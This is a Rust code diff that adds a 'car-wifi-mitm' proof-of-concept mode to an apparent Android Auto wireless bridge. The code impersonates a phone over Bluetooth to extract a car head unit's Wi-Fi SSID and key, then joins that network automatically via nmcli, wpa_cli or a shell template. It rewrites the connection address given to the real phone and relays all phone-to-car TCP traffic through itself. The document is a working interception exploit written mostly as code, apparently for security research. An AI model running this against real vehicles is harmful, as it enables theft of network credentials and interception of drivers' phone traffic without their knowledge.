@@ -18,8 +18,9 @@ use std::sync::atomic::AtomicBool;
 use std::sync::atomic::Ordering;
 use std::sync::Arc;
 use std::time::{Duration, Instant};
-use tokio::io::{AsyncRead, AsyncReadExt, AsyncWrite, AsyncWriteExt};
-use tokio::net::TcpStream;
+use tokio::io::{copy_bidirectional, AsyncRead, AsyncReadExt, AsyncWrite, AsyncWriteExt};
+use tokio::net::{TcpListener, TcpStream};
+use tokio::process::Command;
 use tokio::sync::broadcast::Receiver as BroadcastReceiver;
 use tokio::sync::broadcast::Sender as BroadcastSender;
 use tokio::sync::Notify;
@@ -185,6 +186,19 @@ struct PocHuConnection {
     _client_profile_handle: Option<ProfileHandle>,
 }
 
+#[derive(Debug, Clone)]
+pub struct CarWifiMitmPocOptions {
+    pub hu_mac: String,
+    pub hu_channel: Option<u8>,
+    pub iface: String,
+    pub join_cmd: String,
+    pub auto_join: bool,
+    pub rewrite_ip: String,
+    pub listen_port: u16,
+    pub bt_timeout: Duration,
+    pub stopped: bool,
+}
+
 async fn relay_with_poc_logging<R, W>(
     mut reader: R,
     mut writer: W,
@@ -233,15 +247,15 @@ async fn read_poc_frame(stream: &mut Stream, direction: &'static str) -> Result<
     Ok((message_id, payload))
 }
 
-async fn send_poc_frame(
+async fn send_poc_frame_raw(
     stream: &mut Stream,
     direction: &'static str,
-    message_id: PocMessageId,
+    message_id: u16,
     payload: &[u8],
 ) -> Result<()> {
     let mut packet = Vec::with_capacity(HEADER_LEN + payload.len());
     packet.extend_from_slice(&(payload.len() as u16).to_be_bytes());
-    packet.extend_from_slice(&(message_id as u16).to_be_bytes());
+    packet.extend_from_slice(&message_id.to_be_bytes());
     packet.extend_from_slice(payload);
 
     let mut sniffer = PocFrameSniffer::new(direction);
@@ -250,9 +264,390 @@ async fn send_poc_frame(
     Ok(())
 }
 
+async fn send_poc_frame(
+    stream: &mut Stream,
+    direction: &'static str,
+    message_id: PocMessageId,
+    payload: &[u8],
+) -> Result<()> {
+    send_poc_frame_raw(stream, direction, message_id as u16, payload).await
+}
+
 fn success_status_payload() -> &'static [u8] {
     // MessageStatus::OK encoded as proto2 field #1 varint 0.
     &[0x08, 0x00]
+}
+
+
+fn shell_quote(value: &str) -> String {
+    format!("'{}'", value.replace('\'', "'\\''"))
+}
+
+fn render_wifi_join_cmd(template: &str, iface: &str, info: &WifiInfoResponse::WifiInfoResponse) -> String {
+    template
+        .replace("{iface}", &shell_quote(iface))
+        .replace("{ssid}", &shell_quote(info.ssid()))
+        .replace("{bssid}", &shell_quote(info.bssid()))
+        .replace("{key}", &shell_quote(info.key()))
+        .replace("{security}", &shell_quote(&format!("{:?}", info.security_mode())))
+}
+
+async fn command_available(binary: &str) -> bool {
+    matches!(
+        timeout(Duration::from_secs(2), Command::new(binary).arg("--help").output()).await,
+        Ok(Ok(_))
+    ) || matches!(
+        timeout(Duration::from_secs(2), Command::new("which").arg(binary).output()).await,
+        Ok(Ok(output)) if output.status.success()
+    )
+}
+
+async fn run_wifi_join_custom_cmd(
+    template: &str,
+    iface: &str,
+    info_msg: &WifiInfoResponse::WifiInfoResponse,
+) -> Result<()> {
+    let rendered = render_wifi_join_cmd(template.trim(), iface, info_msg);
+    info!(
+        "{} 🧪 bt-wireless-poc car-wifi-mitm: running configured Wi-Fi join command for ssid={} bssid={} iface={} key_len={}",
+        NAME,
+        info_msg.ssid(),
+        info_msg.bssid(),
+        iface,
+        info_msg.key().len()
+    );
+
+    let output = timeout(
+        Duration::from_secs(30),
+        Command::new("/bin/sh").arg("-c").arg(rendered).output(),
+    )
+    .await??;
+
+    if output.status.success() {
+        info!(
+            "{} 🧪 bt-wireless-poc car-wifi-mitm: Wi-Fi join command completed successfully",
+            NAME
+        );
+        Ok(())
+    } else {
+        let stdout = String::from_utf8_lossy(&output.stdout);
+        let stderr = String::from_utf8_lossy(&output.stderr);
+        Err(format!(
+            "Wi-Fi join command failed status={} stdout={} stderr={}",
+            output.status,
+            stdout.trim(),
+            stderr.trim()
+        )
+        .into())
+    }
+}
+
+async fn current_iw_ssid(iface: &str) -> Option<String> {
+    let output = timeout(
+        Duration::from_secs(3),
+        Command::new("iw").args(["dev", iface, "link"]).output(),
+    )
+    .await
+    .ok()?
+    .ok()?;
+    if !output.status.success() {
+        return None;
+    }
+
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    for line in stdout.lines() {
+        let line = line.trim();
+        if let Some(ssid) = line.strip_prefix("SSID:") {
+            return Some(ssid.trim().to_string());
+        }
+    }
+    None
+}
+
+async fn wait_for_wifi_join(iface: &str, ssid: &str, timeout_duration: Duration) -> bool {
+    let start = Instant::now();
+    while start.elapsed() < timeout_duration {
+        if current_iw_ssid(iface).await.as_deref() == Some(ssid) {
+            info!(
+                "{} 🧪 bt-wireless-poc car-wifi-mitm: iface {} is associated to ssid={}",
+                NAME, iface, ssid
+            );
+            return true;
+        }
+        tokio::time::sleep(Duration::from_millis(500)).await;
+    }
+    false
+}
+
+async fn run_nmcli_wifi_join(
+    iface: &str,
+    info_msg: &WifiInfoResponse::WifiInfoResponse,
+) -> Result<()> {
+    let ssid = info_msg.ssid();
+    let key = info_msg.key();
+    let bssid = info_msg.bssid();
+
+    let mut cmd = Command::new("nmcli");
+    cmd.args(["dev", "wifi", "connect", ssid]);
+    if !key.is_empty() {
+        cmd.args(["password", key]);
+    }
+    if !iface.trim().is_empty() {
+        cmd.args(["ifname", iface.trim()]);
+    }
+    if !bssid.trim().is_empty() {
+        cmd.args(["bssid", bssid.trim()]);
+    }
+
+    info!(
+        "{} 🧪 bt-wireless-poc car-wifi-mitm: auto Wi-Fi join using nmcli ssid={} bssid={} iface={} key_len={}",
+        NAME,
+        ssid,
+        bssid,
+        iface,
+        key.len()
+    );
+
+    let output = timeout(Duration::from_secs(35), cmd.output()).await??;
+    if output.status.success() {
+        Ok(())
+    } else {
+        let stdout = String::from_utf8_lossy(&output.stdout);
+        let stderr = String::from_utf8_lossy(&output.stderr);
+        Err(format!(
+            "nmcli failed status={} stdout={} stderr={}",
+            output.status,
+            stdout.trim(),
+            stderr.trim()
+        )
+        .into())
+    }
+}
+
+fn wpa_quote(value: &str) -> String {
+    let escaped = value
+        .replace('\\', "\\\\")
+        .replace('"', "\\\"");
+    format!("\"{}\"", escaped)
+}
+
+async fn wpa_cli_output(iface: &str, args: &[&str]) -> Result<String> {
+    let output = timeout(
+        Duration::from_secs(5),
+        Command::new("wpa_cli").arg("-i").arg(iface).args(args).output(),
+    )
+    .await??;
+    let stdout = String::from_utf8_lossy(&output.stdout).trim().to_string();
+    let stderr = String::from_utf8_lossy(&output.stderr).trim().to_string();
+    if output.status.success() && !stdout.eq_ignore_ascii_case("FAIL") {
+        Ok(stdout)
+    } else {
+        Err(format!(
+            "wpa_cli {:?} failed status={} stdout={} stderr={}",
+            args, output.status, stdout, stderr
+        )
+        .into())
+    }
+}
+
+async fn run_wpa_cli_wifi_join(
+    iface: &str,
+    info_msg: &WifiInfoResponse::WifiInfoResponse,
+) -> Result<()> {
+    let iface = iface.trim();
+    if iface.is_empty() {
+        return Err("wpa_cli auto join needs cfg.iface to be set".into());
+    }
+
+    let ssid = info_msg.ssid();
+    let key = info_msg.key();
+    let bssid = info_msg.bssid();
+
+    info!(
+        "{} 🧪 bt-wireless-poc car-wifi-mitm: auto Wi-Fi join using wpa_cli ssid={} bssid={} iface={} key_len={}",
+        NAME,
+        ssid,
+        bssid,
+        iface,
+        key.len()
+    );
+
+    let net_id = wpa_cli_output(iface, &["add_network"]).await?;
+    let net_id = net_id.lines().last().unwrap_or(net_id.as_str()).trim().to_string();
+    if net_id.is_empty() || net_id.eq_ignore_ascii_case("FAIL") {
+        return Err(format!("wpa_cli add_network returned invalid network id: {}", net_id).into());
+    }
+
+    wpa_cli_output(iface, &["set_network", &net_id, "ssid", &wpa_quote(ssid)]).await?;
+    if !bssid.trim().is_empty() {
+        // Best-effort. Some wpa_supplicant builds reject bssid for generated networks.
+        if let Err(e) = wpa_cli_output(iface, &["set_network", &net_id, "bssid", bssid.trim()]).await {
+            warn!(
+                "{} 🧪 bt-wireless-poc car-wifi-mitm: wpa_cli could not pin bssid {}: {}",
+                NAME, bssid, e
+            );
+        }
+    }
+
+    if key.is_empty() || info_msg.security_mode() == SecurityMode::OPEN {
+        wpa_cli_output(iface, &["set_network", &net_id, "key_mgmt", "NONE"]).await?;
+    } else {
+        wpa_cli_output(iface, &["set_network", &net_id, "psk", &wpa_quote(key)]).await?;
+    }
+
+    wpa_cli_output(iface, &["enable_network", &net_id]).await?;
+    wpa_cli_output(iface, &["select_network", &net_id]).await?;
+    let _ = wpa_cli_output(iface, &["reassociate"]).await;
+    let _ = wpa_cli_output(iface, &["save_config"]).await;
+    Ok(())
+}
+
+async fn run_car_wifi_join(
+    custom_template: &str,
+    auto_join: bool,
+    iface: &str,
+    info_msg: &WifiInfoResponse::WifiInfoResponse,
+) -> Result<()> {
+    let ssid = info_msg.ssid().trim();
+    let iface = iface.trim();
+    if ssid.is_empty() {
+        return Err("HU WifiInfoResponse did not include an SSID; cannot auto-join Wi-Fi".into());
+    }
+
+    if !iface.is_empty() && current_iw_ssid(iface).await.as_deref() == Some(ssid) {
+        info!(
+            "{} 🧪 bt-wireless-poc car-wifi-mitm: iface {} is already associated to ssid={}",
+            NAME, iface, ssid
+        );
+        return Ok(());
+    }
+
+    if !custom_template.trim().is_empty() {
+        run_wifi_join_custom_cmd(custom_template, iface, info_msg).await?;
+        if iface.is_empty() || wait_for_wifi_join(iface, ssid, Duration::from_secs(10)).await {
+            return Ok(());
+        }
+        warn!(
+            "{} 🧪 bt-wireless-poc car-wifi-mitm: custom command returned success but iface {} is not associated to ssid={} yet",
+            NAME, iface, ssid
+        );
+        return Ok(());
+    }
+
+    if !auto_join {
+        info!(
+            "{} 🧪 bt-wireless-poc car-wifi-mitm: auto Wi-Fi join disabled and no join command configured; assuming SBC is already on car Wi-Fi",
+            NAME
+        );
+        return Ok(());
+    }
+
+    let mut errors = Vec::new();
+    if command_available("nmcli").await {
+        match run_nmcli_wifi_join(iface, info_msg).await {
+            Ok(()) => {
+                if iface.is_empty() || wait_for_wifi_join(iface, ssid, Duration::from_secs(20)).await {
+                    return Ok(());
+                }
+                errors.push("nmcli returned success but association was not observed".to_string());
+            }
+            Err(e) => errors.push(format!("nmcli: {}", e)),
+        }
+    } else {
+        debug!(
+            "{} 🧪 bt-wireless-poc car-wifi-mitm: nmcli not available for auto Wi-Fi join",
+            NAME
+        );
+    }
+
+    if command_available("wpa_cli").await {
+        match run_wpa_cli_wifi_join(iface, info_msg).await {
+            Ok(()) => {
+                if iface.is_empty() || wait_for_wifi_join(iface, ssid, Duration::from_secs(20)).await {
+                    return Ok(());
+                }
+                errors.push("wpa_cli returned success but association was not observed".to_string());
+            }
+            Err(e) => errors.push(format!("wpa_cli: {}", e)),
+        }
+    } else {
+        debug!(
+            "{} 🧪 bt-wireless-poc car-wifi-mitm: wpa_cli not available for auto Wi-Fi join",
+            NAME
+        );
+    }
+
+    if errors.is_empty() {
+        Err("auto Wi-Fi join requested but neither nmcli nor wpa_cli was available".into())
+    } else {
+        Err(format!("auto Wi-Fi join failed: {}", errors.join("; ")).into())
+    }
+}
+
+async fn discover_rewrite_ip(target_ip: &str, iface: &str, override_ip: &str) -> Result<String> {
+    let override_ip = override_ip.trim();
+    if !override_ip.is_empty() {
+        info!(
+            "{} 🧪 bt-wireless-poc car-wifi-mitm: using configured rewrite IP {}",
+            NAME, override_ip
+        );
+        return Ok(override_ip.to_string());
+    }
+
+    if !target_ip.trim().is_empty() {
+        if let Ok(Ok(output)) = timeout(
+            Duration::from_secs(5),
+            Command::new("ip")
+                .args(["-4", "route", "get", target_ip.trim()])
+                .output(),
+        )
+        .await
+        {
+            let stdout = String::from_utf8_lossy(&output.stdout);
+            let tokens: Vec<&str> = stdout.split_whitespace().collect();
+            for pair in tokens.windows(2) {
+                if pair[0] == "src" {
+                    info!(
+                        "{} 🧪 bt-wireless-poc car-wifi-mitm: discovered rewrite IP {} via route to HU {}",
+                        NAME, pair[1], target_ip
+                    );
+                    return Ok(pair[1].to_string());
+                }
+            }
+            debug!(
+                "{} 🧪 bt-wireless-poc car-wifi-mitm: ip route get output had no src: {}",
+                NAME,
+                stdout.trim()
+            );
+        }
+    }
+
+    let iface = iface.trim();
+    if !iface.is_empty() {
+        if let Ok(Ok(output)) = timeout(
+            Duration::from_secs(5),
+            Command::new("ip")
+                .args(["-4", "addr", "show", "dev", iface])
+                .output(),
+        )
+        .await
+        {
+            let stdout = String::from_utf8_lossy(&output.stdout);
+            let tokens: Vec<&str> = stdout.split_whitespace().collect();
+            for pair in tokens.windows(2) {
+                if pair[0] == "inet" {
+                    let ip = pair[1].split('/').next().unwrap_or(pair[1]);
+                    info!(
+                        "{} 🧪 bt-wireless-poc car-wifi-mitm: discovered rewrite IP {} from iface {}",
+                        NAME, ip, iface
+                    );
+                    return Ok(ip.to_string());
+                }
+            }
+        }
+    }
+
+    Err("could not discover local rewrite IP; set bt_wireless_poc_rewrite_ip".into())
 }
 
 pub struct Bluetooth {
@@ -1080,6 +1475,268 @@ impl Bluetooth {
         info!("{} 🧪 bt-wireless-poc bridge: finished", NAME);
         Ok(())
     }
+
+    pub async fn aa_wireless_car_wifi_mitm_poc(
+        &mut self,
+        connect: BluetoothAddressList,
+        options: CarWifiMitmPocOptions,
+    ) -> Result<()> {
+        if options.hu_mac.trim().is_empty() {
+            return Err("bt_wireless_poc_hu_mac must be set for car-wifi-mitm mode".into());
+        }
+
+        let listen_port = if options.listen_port == 0 {
+            5288
+        } else {
+            options.listen_port
+        };
+        let hu_endpoint_hint = match options.hu_channel.filter(|channel| *channel > 0) {
+            Some(channel) => format!("{} RFCOMM channel {}", options.hu_mac.trim(), channel),
+            None => format!("{} AA Wireless SDP auto-discovery", options.hu_mac.trim()),
+        };
+
+        info!(
+            "{} 🧪 bt-wireless-poc car-wifi-mitm: waiting for phone AA RFCOMM, then connecting to HU {}",
+            NAME, hu_endpoint_hint
+        );
+
+        let (phone_addr, mut phone_stream) = self
+            .get_aa_profile_connection(connect, options.bt_timeout, options.stopped)
+            .await?;
+
+        info!(
+            "{} 🧪 bt-wireless-poc car-wifi-mitm: phone connected from {}; connecting to HU {}",
+            NAME, phone_addr, hu_endpoint_hint
+        );
+
+        let hu_conn = self
+            .connect_hu_aa_wireless_poc(options.hu_mac.trim(), options.hu_channel)
+            .await?;
+        let hu_endpoint = hu_conn.endpoint.clone();
+        let PocHuConnection {
+            stream: mut hu_stream,
+            endpoint: _,
+            _client_profile_session: hu_client_profile_session,
+            _client_profile_handle: hu_client_profile_handle,
+        } = hu_conn;
+        let _hu_client_profile_guard = (hu_client_profile_session, hu_client_profile_handle);
+
+        info!(
+            "{} 🧪 bt-wireless-poc car-wifi-mitm: connected to HU {}; starting delayed bootstrap MITM",
+            NAME, hu_endpoint
+        );
+
+        let (hu_start_id, hu_start_payload) = read_poc_frame(&mut hu_stream, "HU -> POC").await?;
+        if hu_start_id != PocMessageId::WifiStartRequest as u16 {
+            return Err(format!(
+                "expected HU WifiStartRequest as first frame, got {} ({})",
+                hu_start_id,
+                PocMessageId::name(hu_start_id)
+            )
+            .into());
+        }
+        let hu_start_req = WifiStartRequest::WifiStartRequest::parse_from_bytes(&hu_start_payload)?;
+        let hu_tcp_ip = hu_start_req.ip_address().to_string();
+        let hu_tcp_port = hu_start_req.port();
+        if hu_tcp_ip.trim().is_empty() || hu_tcp_port <= 0 {
+            return Err(format!(
+                "HU WifiStartRequest had invalid endpoint ip={} port={}",
+                hu_tcp_ip, hu_tcp_port
+            )
+            .into());
+        }
+
+        send_poc_frame(
+            &mut hu_stream,
+            "POC -> HU",
+            PocMessageId::WifiInfoRequest,
+            &[],
+        )
+        .await?;
+
+        let (hu_info_id, hu_info_payload) = read_poc_frame(&mut hu_stream, "HU -> POC").await?;
+        if hu_info_id != PocMessageId::WifiInfoResponse as u16 {
+            return Err(format!(
+                "expected HU WifiInfoResponse as second frame, got {} ({})",
+                hu_info_id,
+                PocMessageId::name(hu_info_id)
+            )
+            .into());
+        }
+        let hu_wifi_info = WifiInfoResponse::WifiInfoResponse::parse_from_bytes(&hu_info_payload)?;
+
+        run_car_wifi_join(
+            &options.join_cmd,
+            options.auto_join,
+            &options.iface,
+            &hu_wifi_info,
+        )
+        .await?;
+        tokio::time::sleep(Duration::from_millis(500)).await;
+
+        let rewrite_ip = discover_rewrite_ip(&hu_tcp_ip, &options.iface, &options.rewrite_ip).await?;
+        let listen_addr = format!("0.0.0.0:{}", listen_port);
+        let listener = TcpListener::bind(listen_addr.as_str()).await?;
+        info!(
+            "{} 🧪 bt-wireless-poc car-wifi-mitm: MD TCP listener bound at {}; phone will receive {}:{} instead of HU {}:{}",
+            NAME, listen_addr, rewrite_ip, listen_port, hu_tcp_ip, hu_tcp_port
+        );
+
+        let mut phone_start_req = WifiStartRequest::WifiStartRequest::parse_from_bytes(&hu_start_payload)?;
+        phone_start_req.set_ip_address(rewrite_ip.clone());
+        phone_start_req.set_port(listen_port as i32);
+        let phone_start_payload = phone_start_req.write_to_bytes()?;
+        send_poc_frame(
+            &mut phone_stream,
+            "POC -> PHONE",
+            PocMessageId::WifiStartRequest,
+            &phone_start_payload,
+        )
+        .await?;
+
+        let (phone_info_req_id, _phone_info_req_payload) =
+            read_poc_frame(&mut phone_stream, "PHONE -> POC").await?;
+        if phone_info_req_id != PocMessageId::WifiInfoRequest as u16 {
+            warn!(
+                "{} 🧪 bt-wireless-poc car-wifi-mitm: expected PHONE WifiInfoRequest, got {} ({})",
+                NAME,
+                phone_info_req_id,
+                PocMessageId::name(phone_info_req_id)
+            );
+        }
+        debug!(
+            "{} 🧪 bt-wireless-poc car-wifi-mitm: consumed PHONE WifiInfoRequest locally; forwarding cached HU WifiInfoResponse to phone",
+            NAME
+        );
+
+        send_poc_frame(
+            &mut phone_stream,
+            "POC -> PHONE",
+            PocMessageId::WifiInfoResponse,
+            &hu_info_payload,
+        )
+        .await?;
+
+        let (phone_start_resp_id, phone_start_resp_payload) =
+            read_poc_frame(&mut phone_stream, "PHONE -> POC").await?;
+        if phone_start_resp_id != PocMessageId::WifiStartResponse as u16 {
+            warn!(
+                "{} 🧪 bt-wireless-poc car-wifi-mitm: expected PHONE WifiStartResponse, got {} ({})",
+                NAME,
+                phone_start_resp_id,
+                PocMessageId::name(phone_start_resp_id)
+            );
+        }
+        send_poc_frame_raw(
+            &mut hu_stream,
+            "POC -> HU",
+            phone_start_resp_id,
+            &phone_start_resp_payload,
+        )
+        .await?;
+
+        let hu_tcp_addr = format!("{}:{}", hu_tcp_ip, hu_tcp_port);
+        info!(
+            "{} 🧪 bt-wireless-poc car-wifi-mitm: waiting for phone TCP and connecting HU TCP {}",
+            NAME, hu_tcp_addr
+        );
+
+        let phone_tcp_fut = listener.accept();
+        let hu_tcp_fut = TcpStream::connect(hu_tcp_addr.as_str());
+        let ((mut phone_tcp, phone_tcp_addr), mut hu_tcp) = tokio::try_join!(
+            async {
+                let (stream, addr) = timeout(Duration::from_secs(45), phone_tcp_fut).await??;
+                Ok::<_, Box<dyn std::error::Error + Send + Sync>>((stream, addr))
+            },
+            async {
+                let stream = timeout(Duration::from_secs(15), hu_tcp_fut).await??;
+                Ok::<_, Box<dyn std::error::Error + Send + Sync>>(stream)
+            }
+        )?;
+        phone_tcp.set_nodelay(true)?;
+        hu_tcp.set_nodelay(true)?;
+        info!(
+            "{} 🧪 bt-wireless-poc car-wifi-mitm: phone TCP {} connected; HU TCP {} connected",
+            NAME, phone_tcp_addr, hu_tcp_addr
+        );
+
+        let mut phone_rfcomm = phone_stream;
+        let mut hu_rfcomm = hu_stream;
+        let rfcomm_status_task = tokio::spawn(async move {
+            match timeout(
+                Duration::from_secs(20),
+                read_poc_frame(&mut phone_rfcomm, "PHONE -> POC"),
+            )
+            .await
+            {
+                Ok(Ok((phone_status_id, phone_status_payload))) => {
+                    if phone_status_id != PocMessageId::WifiConnectStatus as u16 {
+                        warn!(
+                            "{} 🧪 bt-wireless-poc car-wifi-mitm: expected PHONE WifiConnectStatus, got {} ({})",
+                            NAME,
+                            phone_status_id,
+                            PocMessageId::name(phone_status_id)
+                        );
+                    }
+                    send_poc_frame_raw(
+                        &mut hu_rfcomm,
+                        "POC -> HU",
+                        phone_status_id,
+                        &phone_status_payload,
+                    )
+                    .await?;
+                }
+                Ok(Err(e)) => {
+                    warn!(
+                        "{} 🧪 bt-wireless-poc car-wifi-mitm: failed reading PHONE WifiConnectStatus: {}; sending success to HU",
+                        NAME, e
+                    );
+                    send_poc_frame(
+                        &mut hu_rfcomm,
+                        "POC -> HU",
+                        PocMessageId::WifiConnectStatus,
+                        success_status_payload(),
+                    )
+                    .await?;
+                }
+                Err(_) => {
+                    warn!(
+                        "{} 🧪 bt-wireless-poc car-wifi-mitm: timed out waiting for PHONE WifiConnectStatus; sending success to HU",
+                        NAME
+                    );
+                    send_poc_frame(
+                        &mut hu_rfcomm,
+                        "POC -> HU",
+                        PocMessageId::WifiConnectStatus,
+                        success_status_payload(),
+                    )
+                    .await?;
+                }
+            }
+            Ok::<_, Box<dyn std::error::Error + Send + Sync>>(())
+        });
+
+        info!(
+            "{} 🧪 bt-wireless-poc car-wifi-mitm: starting raw AA TCP relay phone<->HU",
+            NAME
+        );
+        let (phone_to_hu, hu_to_phone) = copy_bidirectional(&mut phone_tcp, &mut hu_tcp).await?;
+        if !rfcomm_status_task.is_finished() {
+            rfcomm_status_task.abort();
+        } else if let Ok(Err(e)) = rfcomm_status_task.await {
+            warn!(
+                "{} 🧪 bt-wireless-poc car-wifi-mitm: RFCOMM status forward task failed: {}",
+                NAME, e
+            );
+        }
+        info!(
+            "{} 🧪 bt-wireless-poc car-wifi-mitm: TCP relay ended phone->HU={} bytes HU->phone={} bytes",
+            NAME, phone_to_hu, hu_to_phone
+        );
+
+        Ok(())
+    }
+
 
     pub async fn aa_wireless_probe_poc(
         &mut self,
